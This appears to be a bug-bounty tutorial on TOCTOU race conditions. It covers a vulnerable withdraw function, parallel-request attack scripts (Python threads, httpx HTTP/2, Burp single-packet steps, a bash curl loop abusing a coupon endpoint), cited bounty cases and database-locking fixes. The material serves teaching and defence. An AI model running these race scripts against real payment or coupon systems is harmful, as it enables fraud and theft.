# TOCTOU (Time-of-Check to Time-of-Use) Race Conditions

**Criticidade**: 🟠 Alta (CVSS 7.0-8.5)
**Dificuldade**: 🔴 Avançada
**Bounty Médio**: $1,500 - $12,000 USD

---

## 🔬 TOCTOU Fundamentals

### The Vulnerability

**Sequence:**
```
Time 1: CHECK condition
Time 2: [GAP - race window]
Time 3: USE resource based on check
```

**Exploitation:** Attacker changes state during GAP.

### Classic Example

```python
# VULNERABLE CODE
def withdraw(user_id, amount):
    # 1. CHECK: balance sufficient?
    balance = get_balance(user_id)
    if balance >= amount:
        time.sleep(0.001)  # ← RACE WINDOW!

        # 2. USE: deduct money
        set_balance(user_id, balance - amount)
        return True
    return False
```

**Attack:**
```python
import threading

# Send 100 concurrent requests
threads = [
    threading.Thread(target=withdraw, args=(user_id, 100))
    for _ in range(100)
]

for t in threads:
    t.start()

# Result: Withdrawn 10,000 with balance of 100!
```

---

## 💣 Exploitation Techniques

### 1. HTTP/2 Multiplexing

```python
import httpx
import asyncio

async def race_attack():
    async with httpx.AsyncClient(http2=True) as client:
        # Send 50 simultaneous requests
        tasks = [
            client.post('https://target.com/api/buy', json={'item_id': 1})
            for _ in range(50)
        ]
        responses = await asyncio.gather(*tasks)

# Single connection, truly parallel!
```

### 2. Burp Suite "Single Packet Attack"

```
1. Send request to Repeater
2. Duplicate tab 20 times
3. Right-click → "Send group in parallel (single-packet attack)"
4. All requests sent in single TCP packet
```

### 3. Bash Parallel

```bash
#!/bin/bash
URL="https://target.com/api/coupon/apply"
for i in {1..20}; do
    curl -X POST $URL -d "code=SAVE50" &
done
wait
```

---

## 🔥 Real Cases

**Starbucks Gift Card Race (2015):**
- Use gift card balance multiple times
- Race window: 10ms
- $4,000 bounty

**PayPal Transfer Race (2018):**
- Transfer same $100 to 10 accounts
- TOCTOU in balance check
- $7,500 bounty

**Uber Promo Code Race (2016):**
- Apply promo code 50x
- $10,000 bounty

---

## 🛡️ Prevention

**Use database transactions:**
```python
# SAFE
def withdraw(user_id, amount):
    with db.transaction():
        # Lock row
        balance = db.query('SELECT balance FROM users WHERE id=? FOR UPDATE', user_id)
        if balance >= amount:
            db.execute('UPDATE users SET balance=balance-? WHERE id=?', amount, user_id)
            return True
    return False
```

**Use atomic operations:**
```python
# Redis DECR is atomic
redis.decr(f'balance:{user_id}', amount)
```

---

**Última atualização**: 2024
